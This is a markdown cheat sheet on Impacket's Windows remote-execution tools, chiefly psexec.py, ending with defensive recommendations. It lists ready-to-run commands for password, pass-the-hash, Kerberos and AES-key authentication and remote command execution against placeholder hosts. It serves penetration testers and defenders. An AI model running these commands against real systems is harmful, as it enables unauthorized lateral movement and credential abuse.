# 💡 Command Execution Tools from Impacket

**Impacket** provides multiple tools for remote command execution against Windows systems using:

- SMB
- WMI
- DCOM
- Scheduled Tasks

These are commonly used in:

- 🛡️ Penetration Testing
- 🔴 Red Team Operations
- 🏢 Active Directory Assessments

---

# 📌 Common Impacket Command Execution Tools

| Tool | Method | Authentication | Notes |
| --- | --- | --- | --- |
| `psexec.py` | SMB Service Execution | NTLM / Kerberos | Creates temporary service |
| `wmiexec.py` | WMI | NTLM / Kerberos | Semi-interactive shell |
| `atexec.py` | Task Scheduler | NTLM / Kerberos | Executes via scheduled task |
| `dcomexec.py` | DCOM | NTLM / Kerberos | Uses DCOM objects |
| `smbexec.py` | SMB + CMD | NTLM / Kerberos | No service binary upload |
| `mmcexec.py` | MMC20 COM | NTLM / Kerberos | Less commonly monitored |

---

# 🌸 1. psexec.py

Executes commands by uploading a service binary and creating a temporary Windows service.

---

## 🧪 Syntax

```bash
psexec.py DOMAIN/user:password@TARGET
```

---

## 💻 Example

```bash
psexec.py corp.local/administrator:'Password123!'@10.10.10.5
```

---

## 🔑 Pass-the-Hash

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLMHASH administrator@10.10.10.5
```

---

## 🎫 Kerberos Authentication

```bash
psexec.py -k -no-pass administrator@server.corp.local
```

---

## ⚡ Execute Single Command

```bash
psexec.py administrator@10.10.10.5 "whoami"
```

---

## 📌 Characteristics

- 📤 Uploads executable to `ADMIN$`
- 🛠️ Creates temporary Windows service
- 🔥 High privileges required
- 📜 Very noisy in Windows logs

---

# 🔐 Authentication Options

---

## 👤 Username & Password

```bash
tool.py domain/user:password@target
```

---

## 🔑 Pass-the-Hash (PTH)

```bash
tool.py -hashes LMHASH:NTHASH user@target
```

---

## 🎫 Kerberos Authentication

```bash
tool.py -k -no-pass user@target
```

---

## 🔐 AES Key Authentication

```bash
tool.py -aesKey <AES256_KEY> user@target
```

# ⚠️ Security Notes

- Most tools require:
  - Local administrator privileges
  - SMB access
  - Remote management permissions

- Pass-the-Hash attacks require:
  - NTLM authentication enabled
  - Valid NTLM hashes

- Kerberos authentication requires:
  - Domain connectivity
  - Proper SPN resolution
  - Valid Kerberos tickets or credentials

---

# 🛡️ Defensive Recommendations

- Disable SMBv1 where possible
- Restrict administrative share access
- Monitor:
  - Service creation events
  - WMI activity
  - Scheduled task creation
  - DCOM activity

- Enable:
  - PowerShell logging
  - Sysmon
  - Windows Event Forwarding

- Use:
  - MFA
  - LAPS
  - Credential Guard
